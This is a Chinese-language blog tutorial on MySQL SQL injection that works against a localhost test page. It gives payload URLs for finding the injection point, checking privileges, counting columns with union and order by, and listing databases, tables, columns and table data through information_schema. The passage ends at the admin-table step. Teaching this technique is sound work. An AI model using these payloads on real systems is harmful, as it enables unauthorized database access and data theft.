<!DOCTYPE html>
<html lang="en-us">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <script type="application/javascript" src='https://kayleh.top/js/theme-mode.js'></script>
    <link rel="stylesheet" href='https://kayleh.top/css/frameworks.min.css' />
    <link rel="stylesheet" href='https://kayleh.top/css/github.min.css' />
    <link rel="stylesheet" href='https://kayleh.top/css/github-style.css' />
    <link rel="stylesheet" href='https://kayleh.top/css/light.css' />
    <link rel="stylesheet" href='https://kayleh.top/css/dark.css' />
    <link rel="stylesheet" href='https://kayleh.top/css/syntax.css' />
    <title>SQL injection - Kayleh</title>
    
    <link rel="icon" type="image/x-icon" href='https://kayleh.top/images/favicon.ico'>
    
    <meta name="theme-color" content="#1e2327">

    
    <meta name="description"
  content="SQL注入  https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html
 常见的几种SQL注入  1.数字型 2.字符型 3.文本型 4.搜索型(POST/GET) 5.cookie注入 6.SQL盲注 7.编码注入 8.宽字节注入
 MySQL报错注入基本流程  1.判断sql注入 2.数据库权限判断 3.判断字段数 4.查询库名 5.查表名 6.查字段 7.查数据
 1.数字型 1.判断sql注入
  提交单引号
http://localhost/sqls/index.php?id=2&amp;#39;   and大法和or大法
在参数后面加上and 1 = 1
http://localhost/sqls/index.php?id=2 and 1 = 1 //可以查询 http://localhost/sqls/index.php?id=2 and 1 = 2	//查询错误 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。
接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。
http://localhost/sqls/index.php?id=5 or 1 = 1   加法和减法" />
<meta name="keywords"
  content='' />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://kayleh.top/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" />


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="SQL injection - Kayleh" />
<meta name="twitter:description"
  content="SQL注入  https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html
 常见的几种SQL注入  1.数字型 2.字符型 3.文本型 4.搜索型(POST/GET) 5.cookie注入 6.SQL盲注 7.编码注入 8.宽字节注入
 MySQL报错注入基本流程  1.判断sql注入 2.数据库权限判断 3.判断字段数 4.查询库名 5.查表名 6.查字段 7.查数据
 1.数字型 1.判断sql注入
  提交单引号
http://localhost/sqls/index.php?id=2&amp;#39;   and大法和or大法
在参数后面加上and 1 = 1
http://localhost/sqls/index.php?id=2 and 1 = 1 //可以查询 http://localhost/sqls/index.php?id=2 and 1 = 2	//查询错误 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。
接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。
http://localhost/sqls/index.php?id=5 or 1 = 1   加法和减法" />
<meta name="twitter:site" content="https://kayleh.top" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image"
  content="https://kayleh.top">


<meta property="og:type" content="article" />
<meta property="og:title" content="SQL injection - Kayleh">
<meta property="og:description"
  content="SQL注入  https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html
 常见的几种SQL注入  1.数字型 2.字符型 3.文本型 4.搜索型(POST/GET) 5.cookie注入 6.SQL盲注 7.编码注入 8.宽字节注入
 MySQL报错注入基本流程  1.判断sql注入 2.数据库权限判断 3.判断字段数 4.查询库名 5.查表名 6.查字段 7.查数据
 1.数字型 1.判断sql注入
  提交单引号
http://localhost/sqls/index.php?id=2&amp;#39;   and大法和or大法
在参数后面加上and 1 = 1
http://localhost/sqls/index.php?id=2 and 1 = 1 //可以查询 http://localhost/sqls/index.php?id=2 and 1 = 2	//查询错误 可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。
接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。
http://localhost/sqls/index.php?id=5 or 1 = 1   加法和减法" />
<meta property="og:url" content="https://kayleh.top/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" />
<meta property="og:site_name" content="SQL injection" />
<meta property="og:image"
  content="https://kayleh.top">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2021-04-06 09:48:59 &#43;0800 CST" />










</head>

<body>
  <div style="position: relative">
  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
      <a class="Header-link" href="https://kayleh.top">
        <svg class="octicon" height="32" viewBox="0 0 16 16" version="1.1" width="32">
          <path fill-rule="evenodd"
            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
          </path>
        </svg>
      </a>
    </div>
    <div class="Header-item d-md-none">
      <button class="Header-link btn-link js-details-target" type="button"
        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
          <path fill-rule="evenodd"
            d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
          </path>
        </svg>
      </button>
    </div>
    <div style="display: none;" id="header-search"
      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div
        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
        <div class="position-relative">
          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
            autocomplete="off">
            <label
              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
              <input type="text"
                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
                name="q" value="" placeholder="Search" autocomplete="off">
              <input type="hidden" name="q" value="site:https://kayleh.top">
            </label>
          </form>
        </div>
      </div>
    </div>

    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
      <a class="Header-link " href="https://kayleh.top">
        <svg class="octicon octicon-mark-github v-align-middle" height="32" viewBox="0 0 16 16" version="1.1"
          width="32">
          <path fill-rule="evenodd"
            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
          </path>
        </svg>
      </a>
    </div>
    <div class="Header-item" style="margin-right: 0;">
      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
          version="1.1" width="16" height="16">
          <path fill-rule="evenodd" clip-rule="evenodd"
            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
          </path>
        </svg>
      </a>
    </div>
  </header>
</div>
  
<div>
  <main>
    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
      <div class="px-0">
        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
          <div class="flex-auto min-width-0 width-fit mr-3">
            <div class="d-flex">
              <div class="d-none d-md-block">
                <a class="avatar mr-2 flex-shrink-0" href="https://kayleh.top">
                  <img class=" avatar-user"
                    src="http://cdn.jsdelivr.net/gh/kayleh/cdn/img/2.jpg"
                    width="32" height="32"></a>
              </div>
              <div class="d-flex flex-column">
                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
                  <span class="author">
                    <a href="https://kayleh.top">Kayleh</a></span><span
                    class="path-divider">/</span><strong class="css-truncate-target mr-1" style="max-width: 410px"><a
                      href="https://kayleh.top/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">SQL injection</a></strong>
                </h1>
                <div class="note m-0">
                  Created <relative-time datetime="Tue, 06 Apr 2021 09:48:59 &#43;0800"
                    class="no-wrap">
                    Tue, 06 Apr 2021 09:48:59 &#43;0800</relative-time>

                  
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="container-lg px-3 new-discussion-timeline">
      <div class="repository-content gist-content">
        <div>
          <div class="js-gist-file-update-container js-task-list-container file-box">
            <div id="file-pytest" class="file my-2">
              <div class="file-header d-flex flex-md-items-center flex-items-start">
                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
                    2900 Words
                    

                  </div>
                  <div class="file-actions flex-order-2 pt-0">
                    
                    
                    <a class="muted-link mr-3" href="/tags/security">
                      <svg class="octicon octicon-tag" viewBox="0 0 16 16" version="1.1" width="16" height="16">
                        <path fill-rule="evenodd"
                          d="M2.5 7.775V2.75a.25.25 0 01.25-.25h5.025a.25.25 0 01.177.073l6.25 6.25a.25.25 0 010 .354l-5.025 5.025a.25.25 0 01-.354 0l-6.25-6.25a.25.25 0 01-.073-.177zm-1.5 0V2.75C1 1.784 1.784 1 2.75 1h5.025c.464 0 .91.184 1.238.513l6.25 6.25a1.75 1.75 0 010 2.474l-5.026 5.026a1.75 1.75 0 01-2.474 0l-6.25-6.25A1.75 1.75 0 011 7.775zM6 5a1 1 0 100 2 1 1 0 000-2z">
                        </path>
                      </svg>
                      security
                    </a>
                    
                    
                  </div>
                </div>
              </div>


              <div class="Box-body px-5 pb-5">
                <article class="markdown-body entry-content container-lg"><h1 id="sql注入">SQL注入</h1>
<blockquote>
<p><a href="https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html">https://www.bugbank.cn/q/article/5983ea82cbb936102d3977bb.html</a></p>
</blockquote>
<h2 id="常见的几种sql注入">常见的几种SQL注入</h2>
<blockquote>
<p>1.数字型
2.字符型
3.文本型
4.搜索型(POST/GET)
5.cookie注入
6.SQL盲注
7.编码注入
8.宽字节注入</p>
</blockquote>
<h2 id="mysql报错注入基本流程">MySQL报错注入基本流程</h2>
<blockquote>
<p>1.判断sql注入
2.数据库权限判断
3.判断字段数
4.查询库名
5.查表名
6.查字段
7.查数据</p>
</blockquote>
<h3 id="1数字型">1.数字型</h3>
<p>1.判断sql注入</p>
<ul>
<li>
<p>提交单引号</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39;
</span></code></pre></div></li>
<li>
<p>and大法和or大法</p>
<p>在参数后面加上<code>and 1 = 1</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>     <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">可以查询</span>
http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>	   <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">查询错误</span>
</code></pre></div><p>可以发现and 1=1 返回了数据，而and 1=2没有，这是由于1=1是一个为真的条件，前面的结果是true，true and true 所以没有任何问题，第二个 1=2 是个假条件， true and false还是false，所以并没有数据返回。</p>
<p>接下来看下or、or就是或者，两个都为假，才会为假，只要一个为真就为真，把语句后面的id改成一个不存在的，后面接上or 1=1，这样的话就成了 false or true，结果为true。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</code></pre></div></li>
<li>
<p>加法和减法</p>
<p>加法和减法的使用要区别是数字型还是字符型的注入、然后来区分了、可以看他后面的参数如果是数字、就一定是数字型、如果是一些字母的话就是字符型注入。</p>
<pre><code>select * from user where id=4  //数字型注入 sql 语句
select * from user where username=’fendo’ //字符型注入 sql 语句
</code></pre><ul>
<li>
<p>加法</p>
<p>我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，最后也就是%2b。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">第二条数据</span>
</code></pre></div></li>
<li>
<p>减法</p>
<p>减法是同样的道理，不过不需要对-号进行url编码了</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span><span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">第一条数据</span>
</code></pre></div></li>
</ul>
</li>
<li>
<p>数据库权限判断</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">and</span> ord(mid(<span style="color:#66d9ef">user</span>(),<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">1</span>))<span style="color:#f92672">=</span><span style="color:#ae81ff">114</span>
  
<span style="color:#960050;background-color:#1e0010">解释</span>:
<span style="color:#960050;background-color:#1e0010">判断</span>ROOT权限 <span style="color:#960050;background-color:#1e0010">返回正确存在</span> 
<span style="color:#75715e">----------------------------------
</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">或</span> <span style="color:#66d9ef">and</span> (<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">count</span>(<span style="color:#f92672">*</span>) <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>
  
<span style="color:#960050;background-color:#1e0010">解释</span>:
<span style="color:#66d9ef">and</span> (<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">count</span>(<span style="color:#f92672">*</span>) <span style="color:#66d9ef">from</span> mysql.<span style="color:#66d9ef">user</span>)<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span>   <span style="color:#75715e">/* 如果结果返回正常,说明具有读写权限。
</span><span style="color:#75715e">and (select count(*) from mysql.user)&gt;0   /* 返回错误，应该是管理员给数据库帐户降权了。
</span></code></pre></div></li>
<li>
<p>判断字段数</p>
<p>常用的两种猜解方式:</p>
<ul>
<li>
<p>用union联合查询：and 1=1 union select 1,2,3,4,5…… 或 union select null,null,null&hellip;..</p>
<p>UNION SELECT 联合查询：可以用于一个或多个SELECT的结果集，但是他有一个条件，就是两个select查询语句的查询必须要有相同的列才可以执行，利用这个特性我们可以进行对比查询，也就是说当我们union select的列与它查询的列相同时，页面返回正常。在and后面加上1=1或1=2的作用后面会讲。</p>
</li>
</ul>
<p>例：</p>
<p>当字段为2时页面返回错误</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">错误</span>
http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">正常查询</span>
http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span> <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">错误</span>
<span style="color:#75715e">-----
</span><span style="color:#75715e"></span><span style="color:#960050;background-color:#1e0010">说明字段数就是</span><span style="color:#ae81ff">3</span><span style="color:#960050;background-color:#1e0010">，输入的数大于或小于字段数时都会报错。使用</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span> <span style="color:#960050;background-color:#1e0010">是一样的</span>
http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>
</code></pre></div><ul>
<li>
<p>2.用order by 查询“order by * &ndash; order by</p>
<p>order by查询：在sql语句中是对结果集的指定列进行排序，比如我们想让结果集按照第一列排序就是 order by 1 按照第二列排序 order by 2 依次类推，按照这个原理我们来判断他的字段数，如果我们按照他的第1列进行排序数据库会返回正常，但是当我们按照第100列排序，但是数据库中并不存在第100列，从而报错。  同union</p>
</li>
</ul>
</li>
</ul>
<p><strong>这里有两个问题</strong></p>
<p><strong>第一个</strong>：大部分程序只会调用数据库查询的第一条语句进行查询然后返回（我们这个也是），而通过联合查询出的数据中，我们想看到的数据是在第二条语句中，如果我们想看到我们想要的数据有两种方法，第一种是让第一条数据返回假，第二种是通过sql语句直接返回我们想要的数据。
第一种：我们让第一个查询的结果始终为假</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>  <span style="color:#66d9ef">and</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">null</span>
</code></pre></div><p><strong>第二种</strong>：通过limit语句，limit在mysql中是用来分页的，通过他可以从查询出来的数据中获取我们想要的数据</p>
<p>limit语法:</p>
<pre><code>LIMIT [offset] rows | rows OFFSET offset
</code></pre><p>LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，初始记录行的偏移量是 0(而不是 1)。</p>
<p>列:</p>
<pre><code>SELECT * FROM table LIMIT 5,10; // 检索记录行 6-15
</code></pre><p>在地址后面加入以下代码</p>
<pre><code>http://localhost/sqls/index.php?id=2  union select null,null,null limit 1,1
</code></pre><p>第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。</p>
<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/584a947239ae725aab3ee529f701eb7d.jpg" alt="img"></p>
<ul>
<li>查询库名</li>
</ul>
<p>版本大于5.0的mysql的information_schema库中存储着mysql的所有数据库和表结构信息，所以可以利用information_schema库快速注入。</p>
<p>通过下面的语句可以判断数据库版本</p>
<pre><code>and ord(mid(version(),1,1))&gt;51
</code></pre><p>解释1： 确认数据库版本， 51是ASCII码3 正确则&gt;4.0 错误则&lt;4.0，当版本大于3.0时才能使用union方法；
解释2：ord()是mysql的函数用于获取二进制码；
解释3：mid()是mysql的函数用于截位操作；
解释4：version()是mysql的函数用于获取当前数据库的版本；</p>
<pre><code>http://localhost/sqls/index.php?id=2  and ord(mid(version(),1,1))&gt;51
</code></pre><p><strong>方法一:</strong></p>
<p>可以直接使用mysql自带函数database()查询得到数据库名：</p>
<pre><code>http://localhost/sqls/index.php?id=2 union select 1,database(),3 limit 1,1
</code></pre><p><strong>方法二:</strong></p>
<p>使用以下语句语句得到所有的数据库名</p>
<pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata
</code></pre><p>还可以获取第一个库名：</p>
<pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata limit 0,1
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"></p>
<p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。</p>
<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1
</code></pre><p>获取第二个库名：</p>
<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,2
</code></pre><ul>
<li>查表名</li>
</ul>
<p>在MySQL中，表名存放在information_schema数据库下tables表table_name字段中、查表名我们主要用到的是TABLES表。</p>
<p>方法一:</p>
<p>用group_concat它可以返回查询的所有结果，因为我们需要通过命名判断该我们需要的敏感数据。</p>
<p>group_concat()会计算哪些行属于同一组，将属于同一组的列显示出来。要返回哪些列，由函数参数(就是字段名)决定。分组必须有个标准，就是根据group by指定的列进行分组。</p>
<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='test'
</code></pre><p>方法二:</p>
<p>使用下面的语句也是可以查出来的</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">null</span>,<span style="color:#66d9ef">table_name</span>,<span style="color:#66d9ef">null</span> <span style="color:#66d9ef">from</span> information_schema.tables <span style="color:#66d9ef">where</span> table_schema<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;test&#39;</span>
</code></pre></div><ul>
<li>查字段</li>
</ul>
<p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。</p>
<p>方法一:</p>
<pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='test' and table_name='sqltest'
</code></pre><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"></p>
<p>也可以查看admin表中的字段。</p>
<p>方法二:</p>
<pre><code>http://localhost/sqls/index.php?id=2  union select null,column_name,null from information_schema.columns where table_schema='test' and table_name='admin'
</code></pre><ul>
<li>
<p>查数据</p>
<p>最终想得到的就是字段里的内容了、前面的数据库名、表名都获得了、获取值就很简单了。</p>
<p>方法一:</p>
<p>查询sqltest表:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/</span>sqls<span style="color:#f92672">/</span><span style="color:#66d9ef">index</span>.php<span style="color:#f92672">?</span>id<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>  <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,group_concat(id,title,content),<span style="color:#ae81ff">3</span> <span style="color:#66d9ef">from</span> <span style="color:#f92672">`</span>sqltest<span style="color:#f92672">`</span>
</code></pre></div><p>查询admin表:</p>
